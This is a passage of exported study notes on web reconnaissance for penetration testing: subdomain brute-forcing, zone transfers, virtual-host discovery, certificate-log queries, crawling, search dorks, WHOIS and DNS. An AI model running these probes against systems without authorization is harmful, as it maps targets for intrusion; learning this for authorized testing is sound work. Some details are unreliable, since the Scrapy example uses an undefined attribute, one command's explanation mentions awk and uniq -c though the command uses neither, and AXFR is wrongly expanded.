Subdomains\n\nSubdomains are essentially extensions of a primary domain name, often used to organize different sections or services within a website. For example, a company might use `mail.example.com` for their email server or `blog.example.com` for their blog.\n\nFrom a reconnaissance perspective, subdomains are incredibly valuable. They can expose additional attack surfaces, reveal hidden services, and provide clues about the internal structure of a target's network. Subdomains might host development servers, staging environments, or even forgotten applications that haven't been properly secured.\n\nThe process of discovering subdomains is known as subdomain enumeration. There are two main approaches to subdomain enumeration:\n\n|Approach|Description|Examples|\n|---|---|---|\n|`Active Enumeration`|Directly interacts with the target's DNS servers or utilizes tools to probe for subdomains.|Brute-forcing, DNS zone transfers|\n|`Passive Enumeration`|Collects information about subdomains without directly interacting with the target, relying on public sources.|Certificate Transparency (CT) logs, search engine queries|\n\n`Active enumeration` can be more thorough but carries a higher risk of detection. Conversely, `passive enumeration` is stealthier but may not uncover all subdomains. Combining both techniques can significantly increase the likelihood of discovering a comprehensive list of subdomains associated with your target, expanding your understanding of their online presence and potential vulnerabilities.\n\n### Subdomain Brute-Forcing\n\nSubdomain brute-forcing is a proactive technique used in web reconnaissance to uncover subdomains that may not be readily apparent through passive methods. It involves systematically generating many potential subdomain names and testing them against the target's DNS server to see if they exist. This approach can unveil hidden subdomains that may host valuable information, development servers, or vulnerable applications.\n\nOne of the most versatile tools for subdomain brute-forcing is `dnsenum`. This powerful command-line tool combines various DNS enumeration techniques, including dictionary-based brute-forcing, to uncover subdomains associated with your target.\n\nTo use `dnsenum` for subdomain brute-forcing, you'll typically provide it with the target domain and a wordlist containing potential subdomain names. The tool will then systematically query the DNS server for each potential subdomain and report any that exist.\n\nFor example, the following command would attempt to brute-force subdomains of `example.com` using a wordlist named `subdomains.txt`:\n\nCode: bash\n\n```bash\ndnsenum example.com -f subdomains.txt\n```\n\n### Zone Transfers\n\nDNS zone transfers, also known as AXFR (Asynchronous Full Transfer) requests, offer a potential goldmine of information for web reconnaissance. A zone transfer is a mechanism for replicating DNS data across servers. When a zone transfer is successful, it provides a complete copy of the DNS zone file, which contains a wealth of details about the target domain.\n\nThis zone file lists all the domain's subdomains, their associated IP addresses, mail server configurations, and other DNS records. This is akin to obtaining a blueprint of the target's DNS infrastructure for a reconnaissance expert.\n\nTo attempt a zone transfer, you can use the `dig` command with the `axfr` (full zone transfer) option. For example, to request a zone transfer from the DNS server `ns1.example.com` for the domain `example.com`, you would execute:\n\nCode: bash\n\n```bash\ndig @ns1.example.com example.com axfr\n```\n\nHowever, zone transfers are not always permitted. Many DNS servers are configured to restrict zone transfers to authorized secondary servers only. Misconfigured servers, though, may allow zone transfers from any source, inadvertently exposing sensitive information.\n\n### Virtual Hosts\n\nVirtual hosting is a technique that allows multiple websites to share a single IP address. Each website is associated with a unique hostname, which is used to direct incoming requests to the correct site. This can be a cost-effective way for organizations to host multiple websites on a single server, but it can also create a challenge for web reconnaissance.\n\nSince multiple websites share the same IP address, simply scanning the IP won't reveal all the hosted sites. You need a tool that can test different hostnames against the IP address to see which ones respond.\n\nGobuster is a versatile tool that can be used for various types of brute-forcing, including virtual host discovery. Its `vhost` mode is designed to enumerate virtual hosts by sending requests to the target IP address with different hostnames. If a virtual host is configured for a specific hostname, Gobuster will receive a response from the web server.\n\nTo use Gobuster to brute-force virtual hosts, you'll need a wordlist containing potential hostnames. Here's an example command:\n\nCode: bash\n\n```bash\ngobuster vhost -u http://192.0.2.1 -w hostnames.txt\n```\n\nIn this example, `-u` specifies the target IP address, and `-w` specifies the wordlist file. Gobuster will then systematically try each hostname in the wordlist and report any that results in a valid response from the web server.\n\n### Certificate Transparency (CT) Logs\n\nCertificate Transparency (CT) logs offer a treasure trove of subdomain information for passive reconnaissance. These publicly accessible logs record SSL/TLS certificates issued for domains and their subdomains, serving as a security measure to prevent fraudulent certificates. For reconnaissance, they offer a window into potentially overlooked subdomains.\n\nThe `crt.sh` website provides a searchable interface for CT logs. To efficiently extract subdomains using `crt.sh` within your terminal, you can use a command like this:\n\nCode: bash\n\n```bash\ncurl -s \"https://crt.sh/?q=%25.example.com&output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u\n```\n\nThis command fetches JSON-formatted data from `crt.sh` for `example.com` (the `%` is a wildcard), extracts domain names using `jq`, removes any wildcard prefixes (`*.`) with `sed`, and finally sorts and deduplicates the results.\n\n## Web Crawling\n\nWeb crawling is the automated exploration of a website's structure. A web crawler, or spider, systematically navigates through web pages by following links, mimicking a user's browsing behavior. This process maps out the site's architecture and gathers valuable information embedded within the pages.\n\nA crucial file that guides web crawlers is `robots.txt`. This file resides in a website's root directory and dictates which areas are off-limits for crawlers. Analyzing `robots.txt` can reveal hidden directories or sensitive areas that the website owner doesn't want to be indexed by search engines.\n\n`Scrapy` is a powerful and efficient Python framework for large-scale web crawling and scraping projects. It provides a structured approach to defining crawling rules, extracting data, and handling various output formats.\n\nHere's a basic Scrapy spider example to extract links from `example.com`:\n\nCode: python\n\n```python\nimport scrapy\n\nclass ExampleSpider(scrapy.Spider):\n    name = \"example\"\n    start_urls = ['http://example.com/']\n\n    def parse(self, response):\n        for link in response.css('a::attr(href)').getall():\n            if any(link.endswith(ext) for ext in self.interesting_extensions):\n                yield {\"file\": link}\n            elif not link.startswith(\"#\") and not link.startswith(\"mailto:\"):\n                yield response.follow(link, callback=self.parse)\n```\n\nAfter running the Scrapy spider, you'll have a file containing scraped data (e.g., `example_data.json`). You can analyze these results using standard command-line tools. For instance, to extract all links:\n\nCode: bash\n\n```bash\njq -r '.[] | select(.file != null) | .file' example_data.json | sort -u\n```\n\nThis command uses `jq` to extract links, `awk` to isolate file extensions, `sort` to order them, and `uniq -c` to count their occurrences. By scrutinizing the extracted data, you can identify patterns, anomalies, or sensitive files that might be of interest for further investigation.\n\n## Search Engine Discovery\n\nLeveraging search engines for reconnaissance involves utilizing their vast indexes of web content to uncover information about your target. This passive technique, often referred to as Open Source Intelligence (OSINT) gathering, can yield valuable insights without directly interacting with the target's systems.\n\nBy employing advanced search operators and specialized queries known as \"Google Dorks,\" you can pinpoint specific information buried within search results. Here's a table of some useful search operators for web reconnaissance:\n\n|Operator|Description|Example|\n|---|---|---|\n|`site:`|Restricts search results to a specific website.|`site:example.com \"password reset\"`|\n|`inurl:`|Searches for a specific term in the URL of a page.|`inurl:admin login`|\n|`filetype:`|Limits results to files of a specific type.|`filetype:pdf \"confidential report\"`|\n|`intitle:`|Searches for a term within the title of a page.|`intitle:\"index of\" /backup`|\n|`cache:`|Shows the cached version of a webpage.|`cache:example.com`|\n|`\"search term\"`|Searches for the exact phrase within quotation marks.|`\"internal error\" site:example.com`|\n|`OR`|Combines multiple search terms.|`inurl:admin OR inurl:login`|\n|`-`|Excludes specific terms from search results.|`inurl:admin -intext:wordpress`|\n\nBy creatively combining these operators and crafting targeted queries, you can uncover sensitive documents, exposed directories, login pages, and other valuable information that may aid in your reconnaissance efforts.\n\n## Web Archives\n\nWeb archives are digital repositories that store snapshots of websites across time, providing a historical record of their evolution. Among these archives, the Wayback Machine is the most comprehensive and accessible resource for web reconnaissance.\n\nThe Wayback Machine, a project by the Internet Archive, has been archiving the web for over two decades, capturing billions of web pages from across the globe. This massive historical data collection can be an invaluable resource for security researchers and investigators.\n\n|Feature|Description|Use Case in Reconnaissance|\n|---|---|---|\n|`Historical Snapshots`|View past versions of websites, including pages, content, and design changes.|Identify past website content or functionality that is no longer available.|\n|`Hidden Directories`|Explore directories and files that may have been removed or hidden from the current version of the website.|Discover sensitive information or backups that were inadvertently left accessible in previous versions.|\n|`Content Changes`|Track changes in website content, including text, images, and links.|Identify patterns in content updates and assess the evolution of a website's security posture.|\n\nBy leveraging the Wayback Machine, you can gain a historical perspective on your target's online presence, potentially revealing vulnerabilities that may have been overlooked in the current version of the website.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/02-Introduction",
    "path": "02_CPTS/04-Information Gathering - Web Edition/02-Introduction.md",
    "title": "02 Introduction",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Web Reconnaissance is the foundation of a thorough security assessment. This process involves systematically and meticulously collecting information about a target website or web application. Think of...",
    "category": "02_CPTS",
    "content": "`Web Reconnaissance` is the foundation of a thorough security assessment. This process involves systematically and meticulously collecting information about a target website or web application. Think of it as the preparatory phase before delving into deeper analysis and potential exploitation. It forms a critical part of the \"`Information Gathering`\" phase of the Penetration Testing Process.\n\n![Flowchart of the Penetration Testing Process: Pre-Engagement, Information Gathering, Vulnerability Assessment, Exploitation, Post-Exploitation, Lateral Movement, Proof-of-Concept, and Post-Engagement.](https://academy.hackthebox.com/storage/modules/144/PT-process.png)\n\nThe primary goals of web reconnaissance include:\n\n- `Identifying Assets`: Uncovering all publicly accessible components of the target, such as web pages, subdomains, IP addresses, and technologies used. This step provides a comprehensive overview of the target's online presence.\n- `Discovering Hidden Information`: Locating sensitive information that might be inadvertently exposed, including backup files, configuration files, or internal documentation. These findings can reveal valuable insights and potential entry points for attacks.\n- `Analysing the Attack Surface`: Examining the target's attack surface to identify potential vulnerabilities and weaknesses. This involves assessing the technologies used, configurations, and possible entry points for exploitation.\n- `Gathering Intelligence`: Collecting information that can be leveraged for further exploitation or social engineering attacks. This includes identifying key personnel, email addresses, or patterns of behaviour that could be exploited.\n\nAttackers leverage this information to tailor their attacks, allowing them to target specific weaknesses and bypass security measures. Conversely, defenders use recon to proactively identify and patch vulnerabilities before malicious actors can leverage them.\n\n## Types of Reconnaissance\n\nWeb reconnaissance encompasses two fundamental methodologies: `active` and `passive` reconnaissance. Each approach offers distinct advantages and challenges, and understanding their differences is crucial for adequate information gathering.\n\n### Active Reconnaissance\n\nIn active reconnaissance, the attacker `directly interacts with the target system` to gather information. This interaction can take various forms:\n\n|Technique|Description|Example|Tools|Risk of Detection|\n|---|---|---|---|---|\n|`Port Scanning`|Identifying open ports and services running on the target.|Using Nmap to scan a web server for open ports like 80 (HTTP) and 443 (HTTPS).|Nmap, Masscan, Unicornscan|High: Direct interaction with the target can trigger intrusion detection systems (IDS) and firewalls.|\n|`Vulnerability Scanning`|Probing the target for known vulnerabilities, such as outdated software or misconfigurations.|Running Nessus against a web application to check for SQL injection flaws or cross-site scripting (XSS) vulnerabilities.|Nessus, OpenVAS, Nikto|High: Vulnerability scanners send exploit payloads that security solutions can detect.|\n|`Network Mapping`|Mapping the target's network topology, including connected devices and their relationships.|Using traceroute to determine the path packets take to reach the target server, revealing potential network hops and infrastructure.|Traceroute, Nmap|Medium to High: Excessive or unusual network traffic can raise suspicion.|\n|`Banner Grabbing`|Retrieving information from banners displayed by services running on the target.|Connecting to a web server on port 80 and examining the HTTP banner to identify the web server software and version.|Netcat, curl|Low: Banner grabbing typically involves minimal interaction but can still be logged.|\n|`OS Fingerprinting`|Identifying the operating system running on the target.|Using Nmap's OS detection capabilities (`-O`) to determine if the target is running Windows, Linux, or another OS.|Nmap, Xprobe2|Low: OS fingerprinting is usually passive, but some advanced techniques can be detected.|\n|`Service Enumeration`|Determining the specific versions of services running on open ports.|Using Nmap's service version detection (`-sV`) to determine if a web server is running Apache 2.4.50 or Nginx 1.18.0.|Nmap|Low: Similar to banner grabbing, service enumeration can be logged but is less likely to trigger alerts.|\n|`Web Spidering`|Crawling the target website to identify web pages, directories, and files.|Running a web crawler like Burp Suite Spider or OWASP ZAP Spider to map out the structure of a website and discover hidden resources.|Burp Suite Spider, OWASP ZAP Spider, Scrapy (customisable)|Low to Medium: Can be detected if the crawler's behaviour is not carefully configured to mimic legitimate traffic.|\n\nActive reconnaissance provides a direct and often more comprehensive view of the target's infrastructure and security posture. However, it also carries a higher risk of detection, as the interactions with the target can trigger alerts or raise suspicion.\n\n### Passive Reconnaissance\n\nIn contrast, passive reconnaissance involves gathering information about the target `without directly interacting` with it. This relies on analysing publicly available information and resources, such as:\n\n|Technique|Description|Example|Tools|Risk of Detection|\n|---|---|---|---|---|\n|`Search Engine Queries`|Utilising search engines to uncover information about the target, including websites, social media profiles, and news articles.|Searching Google for \"`[Target Name] employees`\" to find employee information or social media profiles.|Google, DuckDuckGo, Bing, and specialised search engines (e.g., Shodan)|Very Low: Search engine queries are normal internet activity and unlikely to trigger alerts.|\n|`WHOIS Lookups`|Querying WHOIS databases to retrieve domain registration details.|Performing a WHOIS lookup on a target domain to find the registrant's name, contact information, and name servers.|whois command-line tool, online WHOIS lookup services|Very Low: WHOIS queries are legitimate and do not raise suspicion.|\n|`DNS`|Analysing DNS records to identify subdomains, mail servers, and other infrastructure.|Using `dig` to enumerate subdomains of a target domain.|dig, nslookup, host, dnsenum, fierce, dnsrecon|Very Low: DNS queries are essential for internet browsing and are not typically flagged as suspicious.|\n|`Web Archive Analysis`|Examining historical snapshots of the target's website to identify changes, vulnerabilities, or hidden information.|Using the Wayback Machine to view past versions of a target website to see how it has changed over time.|Wayback Machine|Very Low: Accessing archived versions of websites is a normal activity.|\n|`Social Media Analysis`|Gathering information from social media platforms like LinkedIn, Twitter, or Facebook.|Searching LinkedIn for employees of a target organisation to learn about their roles, responsibilities, and potential social engineering targets.|LinkedIn, Twitter, Facebook, specialised OSINT tools|Very Low: Accessing public social media profiles is not considered intrusive.|\n|`Code Repositories`|Analysing publicly accessible code repositories like GitHub for exposed credentials or vulnerabilities.|Searching GitHub for code snippets or repositories related to the target that might contain sensitive information or code vulnerabilities.|GitHub, GitLab|Very Low: Code repositories are meant for public access, and searching them is not suspicious.|\n\nPassive reconnaissance is generally considered stealthier and less likely to trigger alarms than active reconnaissance. However, it may yield less comprehensive information, as it relies on what's already publicly accessible.\n\nIn this module, we will delve into the essential tools and techniques used in web reconnaissance, starting with WHOIS. Understanding the WHOIS protocol provides a gateway to accessing vital information about domain registrations, ownership details, and the digital infrastructure of targets. This foundational knowledge sets the stage for more advanced recon methods we'll explore later.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/03-WHOIS",
    "path": "02_CPTS/04-Information Gathering - Web Edition/03-WHOIS.md",
    "title": "03 WHOIS",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "WHOIS is a widely used query and response protocol designed to access databases that store information about registered internet resources. Primarily associated with domain names, WHOIS can also provi...",
    "category": "02_CPTS",
    "content": "WHOIS is a widely used query and response protocol designed to access databases that store information about registered internet resources. Primarily associated with domain names, WHOIS can also provide details about IP address blocks and autonomous systems. Think of it as a giant phonebook for the internet, letting you look up who owns or is responsible for various online assets.\n\nWHOIS\n\n```shell-session\ndrxh3kr@htb[/htb]$ whois inlanefreight.com\n\n[...]\nDomain Name: inlanefreight.com\nRegistry Domain ID: 2420436757_DOMAIN_COM-VRSN\nRegistrar WHOIS Server: whois.registrar.amazon\nRegistrar URL: https://registrar.amazon.com\nUpdated Date: 2023-07-03T01:11:15Z\nCreation Date: 2019-08-05T22:43:09Z\n[...]\n```\n\nEach WHOIS record typically contains the following information:\n\n- `Domain Name`: The domain name itself (e.g., example.com)\n- `Registrar`: The company where the domain was registered (e.g., GoDaddy, Namecheap)\n- `Registrant Contact`: The person or organization that registered the domain.\n- `Administrative Contact`: The person responsible for managing the domain.\n- `Technical Contact`: The person handling technical issues related to the domain.\n- `Creation and Expiration Dates`: When the domain was registered and when it's set to expire.\n- `Name Servers`: Servers that translate the domain name into an IP address.\n\n## History of WHOIS\n\nThe history of WHOIS is intrinsically linked to the vision and dedication of [Elizabeth Feinler](https://en.wikipedia.org/wiki/Elizabeth_J._Feinler), a computer scientist who played a pivotal role in shaping the early internet.\n\nIn the 1970s, Feinler and her team at the Stanford Research Institute's Network Information Center (NIC) recognised the need for a system to track and manage the growing number of network resources on the ARPANET, the precursor to the modern internet. Their solution was the creation of the WHOIS directory, a rudimentary yet groundbreaking database that stored information about network users, hostnames, and domain names.\n\nClick to expand on an interesting bit of internet history if you are interested\n\n  \n\n## Why WHOIS Matters for Web Recon\n\nWHOIS data serves as a treasure trove of information for penetration testers during the reconnaissance phase of an assessment. It offers valuable insights into the target organisation's digital footprint and potential vulnerabilities:\n\n- `Identifying Key Personnel`: WHOIS records often reveal the names, email addresses, and phone numbers of individuals responsible for managing the domain. This information can be leveraged for social engineering attacks or to identify potential targets for phishing campaigns.\n- `Discovering Network Infrastructure`: Technical details like name servers and IP addresses provide clues about the target's network infrastructure. This can help penetration testers identify potential entry points or misconfigurations.\n- `Historical Data Analysis`: Accessing historical WHOIS records through services like [WhoisFreaks](https://whoisfreaks.com/) can reveal changes in ownership, contact information, or technical details over time. This can be useful for tracking the evolution of the target's digital presence.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/04-Utilising WHOIS",
    "path": "02_CPTS/04-Information Gathering - Web Edition/04-Utilising WHOIS.md",
    "title": "04 Utilising WHOIS",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Let's consider three scenarios to help illustrate the value of WHOIS data. Scenario 1: Phishing Investigation An email security gateway flags a suspicious email sent to multiple employees within a com...",
    "category": "02_CPTS",
    "content": "Let's consider three scenarios to help illustrate the value of WHOIS data.\n\n## Scenario 1: Phishing Investigation\n\nAn email security gateway flags a suspicious email sent to multiple employees within a company. The email claims to be from the company's bank and urges recipients to click on a link to update their account information. A security analyst investigates the email and begins by performing a WHOIS lookup on the domain linked in the email.\n\nThe WHOIS record reveals the following:\n\n- `Registration Date`: The domain was registered just a few days ago.\n- `Registrant`: The registrant's information is hidden behind a privacy service.\n- `Name Servers`: The name servers are associated with a known bulletproof hosting provider often used for malicious activities.\n\nThis combination of factors raises significant red flags for the analyst. The recent registration date, hidden registrant information, and suspicious hosting strongly suggest a phishing campaign. The analyst promptly alerts the company's IT department to block the domain and warns employees about the scam.\n\nFurther investigation into the hosting provider and associated IP addresses may uncover additional phishing domains or infrastructure the threat actor uses.\n\n## Scenario 2: Malware Analysis\n\nA security researcher is analysing a new strain of malware that has infected several systems within a network. The malware communicates with a remote server to receive commands and exfiltrate stolen data. To gain insights into the threat actor's infrastructure, the researcher performs a WHOIS lookup on the domain associated with the command-and-control (C2) server.\n\nThe WHOIS record reveals:\n\n- `Registrant`: The domain is registered to an individual using a free email service known for anonymity.\n- `Location`: The registrant's address is in a country with a high prevalence of cybercrime.\n- `Registrar`: The domain was registered through a registrar with a history of lax abuse policies.\n\nBased on this information, the researcher concludes that the C2 server is likely hosted on a compromised or \"bulletproof\" server. The researcher then uses the WHOIS data to identify the hosting provider and notify them of the malicious activity.\n\n## Scenario 3: Threat Intelligence Report\n\nA cybersecurity firm tracks the activities of a sophisticated threat actor group known for targeting financial institutions. Analysts gather WHOIS data on multiple domains associated with the group's past campaigns to compile a comprehensive threat intelligence report.\n\nBy analysing the WHOIS records, analysts uncover the following patterns:\n\n- `Registration Dates`: The domains were registered in clusters, often shortly before major attacks.\n- `Registrants`: The registrants use various aliases and fake identities.\n- `Name Servers`: The domains often share the same name servers, suggesting a common infrastructure.\n- `Takedown History`: Many domains have been taken down after attacks, indicating previous law enforcement or security interventions.\n\nThese insights allow analysts to create a detailed profile of the threat actor's tactics, techniques, and procedures (TTPs). The report includes indicators of compromise (IOCs) based on the WHOIS data, which other organisations can use to detect and block future attacks.\n\n## Using WHOIS\n\nBefore using the `whois` command, you'll need to ensure it's installed on your Linux system. It's a utility available through linux package managers, and if it's not installed, it can be installed simply with\n\nUtilising WHOIS\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt update\ndrxh3kr@htb[/htb]$ sudo apt install whois -y\n```\n\nThe simplest way to access WHOIS data is through the `whois` command-line tool. Let's perform a WHOIS lookup on `facebook.com`:\n\nUtilising WHOIS\n\n```shell-session\ndrxh3kr@htb[/htb]$ whois facebook.com\n\n   Domain Name: FACEBOOK.COM\n   Registry Domain ID: 2320948_DOMAIN_COM-VRSN\n   Registrar WHOIS Server: whois.registrarsafe.com\n   Registrar URL: http://www.registrarsafe.com\n   Updated Date: 2024-04-24T19:06:12Z\n   Creation Date: 1997-03-29T05:00:00Z\n   Registry Expiry Date: 2033-03-30T04:00:00Z\n   Registrar: RegistrarSafe, LLC\n   Registrar IANA ID: 3237\n   Registrar Abuse Contact Email: abusecomplaints@registrarsafe.com\n   Registrar Abuse Contact Phone: +1-650-308-7004\n   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited\n   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited\n   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited\n   Name Server: A.NS.FACEBOOK.COM\n   Name Server: B.NS.FACEBOOK.COM\n   Name Server: C.NS.FACEBOOK.COM\n   Name Server: D.NS.FACEBOOK.COM\n   DNSSEC: unsigned\n   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/\n>>> Last update of whois database: 2024-06-01T11:24:10Z <<<\n\n[...]\nRegistry Registrant ID:\nRegistrant Name: Domain Admin\nRegistrant Organization: Meta Platforms, Inc.\n[...]\n```\n\nThe WHOIS output for `facebook.com` reveals several key details:\n\n1. `Domain Registration`:\n    \n    - `Registrar`: RegistrarSafe, LLC\n    - `Creation Date`: 1997-03-29\n    - `Expiry Date`: 2033-03-30\n    \n    These details indicate that the domain is registered with RegistrarSafe, LLC, and has been active for a considerable period, suggesting its legitimacy and established online presence. The distant expiry date further reinforces its longevity.\n    \n2. `Domain Owner`:\n    \n    - `Registrant/Admin/Tech Organization`: Meta Platforms, Inc.\n    - `Registrant/Admin/Tech Contact`: Domain Admin\n    \n    This information identifies Meta Platforms, Inc. as the organization behind `facebook.com`, and \"Domain Admin\" as the point of contact for domain-related matters. This is consistent with the expectation that Facebook, a prominent social media platform, is owned by Meta Platforms, Inc.\n    \n3. `Domain Status`:\n    \n    - `clientDeleteProhibited`, `clientTransferProhibited`, `clientUpdateProhibited`, `serverDeleteProhibited`, `serverTransferProhibited`, and `serverUpdateProhibited`\n    \n    These statuses indicate that the domain is protected against unauthorized changes, transfers, or deletions on both the client and server sides. This highlights a strong emphasis on security and control over the domain.\n    \n4. `Name Servers`:\n    \n    - `A.NS.FACEBOOK.COM`, `B.NS.FACEBOOK.COM`, `C.NS.FACEBOOK.COM`, `D.NS.FACEBOOK.COM`\n    \n    These name servers are all within the `facebook.com` domain, suggesting that Meta Platforms, Inc. manages its DNS infrastructure. It is common practice for large organizations to maintain control and reliability over their DNS resolution.\n    \n\nOverall, the WHOIS output for `facebook.com` aligns with expectations for a well-established and secure domain owned by a large organization like Meta Platforms, Inc.\n\nWhile the WHOIS record provides contact information for domain-related issues, it might not be directly helpful in identifying individual employees or specific vulnerabilities. This highlights the need to combine WHOIS data with other reconnaissance techniques to understand the target's digital footprint comprehensively.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/05-DNS",
    "path": "02_CPTS/04-Information Gathering - Web Edition/05-DNS.md",
    "title": "05 DNS",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "The Domain Name System (DNS) acts as the internet's GPS, guiding your online journey from memorable landmarks (domain names) to precise numerical coordinates (IP addresses). Much like how GPS translat...",
    "category": "02_CPTS",
    "content": "The `Domain Name System` (`DNS`) acts as the internet's GPS, guiding your online journey from memorable landmarks (domain names) to precise numerical coordinates (IP addresses). Much like how GPS translates a destination name into latitude and longitude for navigation, DNS translates human-readable domain names (like `www.example.com`) into the numerical IP addresses (like `192.0.2.1`) that computers use to communicate.\n\nImagine navigating a city by memorizing the exact latitude and longitude of every location you want to visit. It would be incredibly cumbersome and inefficient. DNS eliminates this complexity by allowing us to use easy-to-remember domain names instead. When you type a domain name into your browser, DNS acts as your navigator, swiftly finding the corresponding IP address and directing your request to the correct destination on the internet.\n\nWithout DNS, navigating the online world would be akin to driving without a map or GPS – a frustrating and error-prone endeavour.\n\n## How DNS Works\n\nImagine you want to visit a website like `www.example.com`. You type this friendly domain name into your browser, but your computer doesn't understand words – it speaks the language of numbers, specifically IP addresses. So, how does your computer find the website's IP address? Enter DNS, the internet's trusty translator.\n\n![Flowchart showing two main sections: User Database and Data Collection. Includes steps like 'Check User', 'Send to Source Database', 'Store Data', and 'Send to UI System'.](https://mermaid.ink/svg/pako:eNptkk1uwjAQha8y8rpcIItWkAAtUNQmlSrksDDxlEQQT-QfJIS4ex2nNG1arzx-n5-ex3NhBUlkEdtr0ZSwSnMFfhm36w425DTEVDfOou60do15XGJxMBCLosQtjEb3MLk8vcCMnJIP156ceA3WFIiYZ6ikgWSdwatDfQZLkKKh4wn1dnBngyZceuQxKYWFNS39jjtTWfyCvdsgb2t9c-wN4-CU_A7dy8mPjFOeYuG0qU4IK6KDa4bgLdjck9ZpZcC_20e7dWmYbRroGU-JLKxFjZCh7h88C_KCv62Sf9RFUJd87GxJurLCtsH-cssuUlfMu8blit2xGnUtKul_-NKKObMl1pizyG-l0Iec5erqOeEsZWdVsMhqh3dMk9uXLPoQR-Mr10hhMamE73L9fYqysqSfuwEKc3T9BOe0sj4)\n\n1. `Your Computer Asks for Directions (DNS Query)`: When you enter the domain name, your computer first checks its memory (cache) to see if it remembers the IP address from a previous visit. If not, it reaches out to a DNS resolver, usually provided by your internet service provider (ISP).\n    \n2. `The DNS Resolver Checks its Map (Recursive Lookup)`: The resolver also has a cache, and if it doesn't find the IP address there, it starts a journey through the DNS hierarchy. It begins by asking a root name server, which is like the librarian of the internet.\n    \n3. `Root Name Server Points the Way`: The root server doesn't know the exact address but knows who does – the Top-Level Domain (TLD) name server responsible for the domain's ending (e.g., .com, .org). It points the resolver in the right direction.\n    \n4. `TLD Name Server Narrows It Down`: The TLD name server is like a regional map. It knows which authoritative name server is responsible for the specific domain you're looking for (e.g., `example.com`) and sends the resolver there.\n    \n5. `Authoritative Name Server Delivers the Address`: The authoritative name server is the final stop. It's like the street address of the website you want. It holds the correct IP address and sends it back to the resolver.\n    \n6. `The DNS Resolver Returns the Information`: The resolver receives the IP address and gives it to your computer. It also remembers it for a while (caches it), in case you want to revisit the website soon.\n    \n7. `Your Computer Connects`: Now that your computer knows the IP address, it can connect directly to the web server hosting the website, and you can start browsing.\n    \n\n### The Hosts File\n\nThe `hosts` file is a simple text file used to map hostnames to IP addresses, providing a manual method of domain name resolution that bypasses the DNS process. While DNS automates the translation of domain names to IP addresses, the `hosts` file allows for direct, local overrides. This can be particularly useful for development, troubleshooting, or blocking websites.\n\nThe `hosts` file is located in `C:\\Windows\\System32\\drivers\\etc\\hosts` on Windows and in `/etc/hosts` on Linux and MacOS. Each line in the file follows the format:\n\nCode: txt\n\n```txt\n<IP Address>    <Hostname> [<Alias> ...]\n```\n\nFor example:\n\nCode: txt\n\n```txt\n127.0.0.1       localhost\n192.168.1.10    devserver.local\n```\n\nTo edit the `hosts` file, open it with a text editor using administrative/root privileges. Add new entries as needed, and then save the file. The changes take effect immediately without requiring a system restart.\n\nCommon uses include redirecting a domain to a local server for development:\n\nCode: txt\n\n```txt\n127.0.0.1       myapp.local\n```\n\ntesting connectivity by specifying an IP address:\n\nCode: txt\n\n```txt\n192.168.1.20    testserver.local\n```\n\nor blocking unwanted websites by redirecting their domains to a non-existent IP address:\n\nCode: txt\n\n```txt\n0.0.0.0       unwanted-site.com\n```\n\n### It's Like a Relay Race\n\nThink of the DNS process as a relay race. Your computer starts with the domain name and passes it along to the resolver. The resolver then passes the request to the root server, the TLD server, and finally, the authoritative server, each one getting closer to the destination. Once the IP address is found, it's relayed back down the chain to your computer, allowing you to access the website.\n\n### Key DNS Concepts\n\nIn the `Domain Name System` (`DNS`), a `zone` is a distinct part of the domain namespace that a specific entity or administrator manages. Think of it as a virtual container for a set of domain names. For example, `example.com` and all its subdomains (like `mail.example.com` or `blog.example.com`) would typically belong to the same DNS zone.\n\nThe zone file, a text file residing on a DNS server, defines the resource records (discussed below) within this zone, providing crucial information for translating domain names into IP addresses.\n\nTo illustrate, here's a simplified example of what a zone file, for `example.com` might look like:\n\nCode: zone\n\n```dns-zone\n$TTL 3600 ; Default Time-To-Live (1 hour)\n@       IN SOA   ns1.example.com. admin.example.com. (\n                2024060401 ; Serial number (YYYYMMDDNN)\n                3600       ; Refresh interval\n                900        ; Retry interval\n                604800     ; Expire time\n                86400 )    ; Minimum TTL\n\n@       IN NS    ns1.example.com.\n@       IN NS    ns2.example.com.\n@       IN MX 10 mail.example.com.\nwww     IN A     192.0.2.1\nmail    IN A     198.51.100.1\nftp     IN CNAME www.example.com.\n```\n\nThis file defines the authoritative name servers (`NS` records), mail server (`MX` record), and IP addresses (`A` records) for various hosts within the `example.com` domain.\n\nDNS servers store various resource records, each serving a specific purpose in the domain name resolution process. Let's explore some of the most common DNS concepts:\n\n|DNS Concept|Description|Example|\n|---|---|---|\n|`Domain Name`|A human-readable label for a website or other internet resource.|`www.example.com`|\n|`IP Address`|A unique numerical identifier assigned to each device connected to the internet.|`192.0.2.1`|\n|`DNS Resolver`|A server that translates domain names into IP addresses.|Your ISP's DNS server or public resolvers like Google DNS (`8.8.8.8`)|\n|`Root Name Server`|The top-level servers in the DNS hierarchy.|There are 13 root servers worldwide, named A-M: `a.root-servers.net`|\n|`TLD Name Server`|Servers responsible for specific top-level domains (e.g., .com, .org).|[Verisign](https://en.wikipedia.org/wiki/Verisign) for `.com`, [PIR](https://en.wikipedia.org/wiki/Public_Interest_Registry) for `.org`|\n|`Authoritative Name Server`|The server that holds the actual IP address for a domain.|Often managed by hosting providers or domain registrars.|\n|`DNS Record Types`|Different types of information stored in DNS.|A, AAAA, CNAME, MX, NS, TXT, etc.|\n\nNow that we've explored the fundamental concepts of DNS, let's dive deeper into the building blocks of DNS information – the various record types. These records store different types of data associated with domain names, each serving a specific 